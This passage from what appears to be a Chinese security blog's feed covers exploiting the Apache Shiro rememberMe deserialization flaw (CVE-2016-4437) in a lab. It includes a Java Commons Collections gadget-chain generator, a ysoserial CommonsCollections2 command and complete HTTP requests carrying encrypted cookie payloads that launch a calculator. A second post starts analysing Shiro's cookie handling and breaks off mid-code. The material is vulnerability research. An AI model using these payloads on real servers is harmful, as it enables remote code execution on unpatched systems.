class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;v&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(obj);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送如下HTTP请求，即可弹出计算器。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.11.34.121:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/css,*/*;q=0.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=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</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-CommonsCollections2"><a href="#0x05-CommonsCollections2" class="headerlink" title="0x05 CommonsCollections2"></a>0x05 CommonsCollections2</h2><p>当Commons Collections版本为4.0，可以直接利用ysoserial工具中的CommonsCollections2链。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections2 <span class="string">&quot;open -a Calculator&quot;</span> &gt; cc2.ser</span><br></pre></td></tr></table></figure><p>依旧使用如上Python脚本对cc2.ser进行加密与编码，然后构造如下请求，并发送。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.11.34.121:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/css,*/*;q=0.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=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</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终成功弹出计算器。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/18.png"></p><p>CommonsCollections2与CommonsBeanutils1很类似，Kick-off与Sink都相同，二者的不同点在于中间Gadget链的不同，CommonsCollections2通过在org.apache.commons.collections4.comparators.TransformingComparator#compare方法中触发org.apache.commons.collections4.functors.InvokerTransformer#transform方法的调用，最终在InvokerTransformer#transform方法中通过反射调用TemplatesImpl执行任意恶意字节码。</p><p>上图中抛出的报错日志也详细地展示了CommonsCollections2链的调用栈。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/7950">https://xz.aliyun.com/t/7950</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java</a></p><p><a href="https://github.com/phith0n/JavaThings/">https://github.com/phith0n/JavaThings/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> rce </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-4437 SHIRO-550反序列化漏洞</title>
      <link href="/cve-2016-4437-apache-shiro-rce.html"/>
      <url>/cve-2016-4437-apache-shiro-rce.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4">0x01 影响范围</a></li><li><a href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x02 环境搭建</a></li><li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x03 漏洞分析</a><ul><li><a href="#%E7%9B%B8%E5%85%B3%E5%A4%84%E7%90%86%E7%B1%BB">相关处理类</a></li><li><a href="#%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B">处理流程</a></li><li><a href="#Base64%E8%A7%A3%E7%A0%81">Base64解码</a></li><li><a href="#AES%E8%A7%A3%E5%AF%86">AES解密</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li></ul></li><li><a href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x04 漏洞利用</a></li><li><a href="#0x05-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">0x05 漏洞修复</a></li><li><a href="#0x06-%E5%8F%82%E8%80%83">0x06 参考</a></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>Apache Shiro是一个强大且易于使用的Java安全框架，用于身份验证、授权、加密和会话管理等安全领域，它提供了一套全面的安全功能，包括身份认证、授权、加密和会话管理，可以轻松地集成到各种Java应用程序中。</p><p>Apache Shiro自0.9版本开始设计了RememberMe的功能，该功能是一种身份认证机制，允许用户在登录后长时间内保持登录状态，即使关闭浏览器或注销账户后再次访问时仍然保持登录状态。当未手动为RememberMe功能配置密钥时，攻击者可以通过发送特定参数的请求对Shiro执行任意代码或绕过预期的访问限制。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>该漏洞影响1.2.5以前的版本，但受后续版本的修复方式所限，如果密钥被泄漏，攻击者依旧能够造成任意代码执行或绕过访问限制。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>从Shiro的GitHub仓库克隆下来，并切换至shiro-root-1.2.4分支。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro &amp;&amp; <span class="built_in">cd</span> shiro/</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p>使用IntelliJ IDEA打开此项目，需要先在<code>samples/web/pom.xml</code>中指定jstl的版本为1.2，不然后面运行起来会报500。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后将Java版本设置在8u71以上，尽量接近实战中的环境。继续同步Maven依赖，并参考如下图新增Tomcat运行配置。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/0.png"></p><p>等待依赖同步完毕，便可以运行起来。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/1.png"></p><p>调试也是没问题的。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/2.png"></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>在登录应用程序时，当勾选rememberMe的功能，如果登录失败，在Set-Cookie响应头中就会有<code>rememberMe=deleteMe</code>。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/3.png"></p><p>若成功登录，则会返回有效的rememberMe Set-Cookie头，并携带这个rememberMe跳转至登录页面。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/4.png"></p><p>据此，对应用处理rememberMe的流程进行分析。</p><h3 id="相关处理类"><a href="#相关处理类" class="headerlink" title="相关处理类"></a>相关处理类</h3><p>在Shiro中，org.apache.shiro.web.mgt.CookieRememberMeManager是用于管理RememberMe功能的核心类之一，它负责生成、解析和验证RememberMe Cookie。</p><p>该继承自shiro-core中的org.apache.shiro.mgt.AbstractRememberMeManager，而AbstractRememberMeManager实现了org.apache.shiro.mgt.RememberMeManager接口。</p><h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><p>根据samples&#x2F;web&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml的映射关系，可知请求任意Web路径都会由org.apache.shiro.web.servlet.ShiroFilter类处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ShiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.shiro.web.servlet.ShiroFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ShiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ShiroFilter类继承自AbstractShiroFilter类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroFilter</span> <span class="keyword">extends</span> <span class="title class_">AbstractShiroFilter</span></span><br></pre></td></tr></table></figure><p>而AbstractShiroFilter类又继承OncePerRequestFilter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractShiroFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span></span><br></pre></td></tr></table></figure><p>在OncePerRequestFilter#doFilter方法中调用了doFilterInternal方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain filterChain)</span></span><br><span class="line">        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">alreadyFilteredAttributeName</span> <span class="operator">=</span> getAlreadyFilteredAttributeName();</span><br><span class="line">    <span class="keyword">if</span> ( request.getAttribute(alreadyFilteredAttributeName) != <span class="literal">null</span> ) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Filter &#x27;&#123;&#125;&#x27; already executed.  Proceeding without invoking this filter.&quot;</span>, getName());</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="comment">//noinspection deprecation</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Do invoke this filter...</span></span><br><span class="line">        